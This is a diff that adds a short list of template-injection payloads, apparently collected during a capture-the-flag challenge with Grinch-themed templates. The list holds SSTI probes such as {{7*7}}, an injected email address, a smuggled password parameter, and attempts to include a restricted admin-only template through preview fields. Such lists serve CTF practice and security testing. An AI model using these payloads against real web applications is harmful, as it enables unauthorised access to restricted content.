@@ -1,0 +1,23 @@
+${7*7}
+1. Open [                                             ] and Enter the mail Payload : sudo_bash{{8*8}}@wearehackerone.com
+?username=grinchadmin%26password=${new}${letter}%25
+Hi {{name}}
+preview_markup=Hello {{name}} ....asd&preview_data={"name":"Alice","email":"alice@test.com"}
+preview_markup=Hello{{name}}{{template:38dhs_admins_only_header.html}}{{email}}&preview_data={"name":"Alice","email":"alice@test.com"}
+preview_markup={{email}}&preview_data={"name":"aaaa","email":"{{template:38dhs_admins_only_header.html}}"}
+value='{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}'
+{"payload":"{{template:38dhs_admins_only_header.html}}"}
+{{7*7}}
+{{email}}
+{{name}}
+{{payload}}
+{{template:..}}
+{{template:38dhs_admins_only_header.html  }}
+{{template:<TEMPLATE_NAME>}}
+{{template:<file-name>}}
+{{template:RANDOMTHINGS}}
+{{template:cbdj3_grinch_footer.html}}
+{{template:cbdj3_grinch_header.html}}
+{{template:cbdj3_grinch_header.html}} Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
+{{template:cbdj3_grinch_header.html}}Hi {{name}}..... Guess what..... <strong>YOU SUCK!</strong>{{template:cbdj3_grinch_footer.html}}
+{{template:}}
